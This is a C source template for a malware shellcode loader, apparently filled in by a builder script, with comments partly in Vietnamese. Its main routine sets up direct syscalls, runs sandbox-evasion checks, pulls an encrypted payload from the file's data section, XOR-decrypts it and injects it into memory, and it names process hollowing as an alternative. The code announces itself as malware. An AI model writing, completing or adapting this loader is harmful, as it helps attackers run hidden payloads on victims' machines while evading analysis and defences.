// #include <windows.h>
#include "core/utils.h"
#include "techniques/T_encryption.h"
#include "techniques/T_injection.h"
#include "techniques/T_storage.h"
#include "techniques/T_evasion.h"

/*{{DEFINES}}*/

// Placeholders sẽ được builder.py thay thế
unsigned char shellcode[] = /*{{SHELLCODE}}*/
unsigned int shellcode_len = /*{{SHELLCODE_LEN}}*/;
char* key = /*{{KEY}}*/;

PVOID g_syscall_addr = NULL;
DWORD g_ssn_NtAllocateVirtualMemory = 0;
DWORD g_ssn_NtCreateThreadEx = 0;
DWORD g_ssn_NtWaitForSingleObject = 0;

int main(void) {

    DEBUG_MSG("Start", "Hello from malware");

    // --- Initialze ---
    #ifdef USE_DIRECT_SYSCALLS
        DEBUG_MSG("Initialze", "Initialze syscall...");
        if (!InitializeSyscalls()) {
            // Có thể thêm một hành động thoát im lặng ở đây
            return 1; 
        }
    #endif

    // 1. STAGE 0: Anti-Analysis
    #ifdef EVASION_CHECKS_ENABLED
        if (!Stage0_Environment_Check()) return; // Exit if run in sandbox
    #endif


    // 2. STAGE 1: Storage Access
    PayloadInfo payload = Stage1_Access_DataSection();


    // 3. STAGE 3 (Part A): Transformation
    #ifdef ENCRYPTION_XOR
        Stage3_Decrypt_XOR(&payload);
    #endif

    // 4. STAGE 2 + 3(Part B) + 4: Injection Recipe
    #ifdef INJECTION_CLASSIC
        Inject_Classic(payload.data, payload.length);
    #elif defined(INJECTION_HOLLOWING)
        // Inject_ProcessHollowing(payload.data, payload.length);
    #endif

    return 0;
}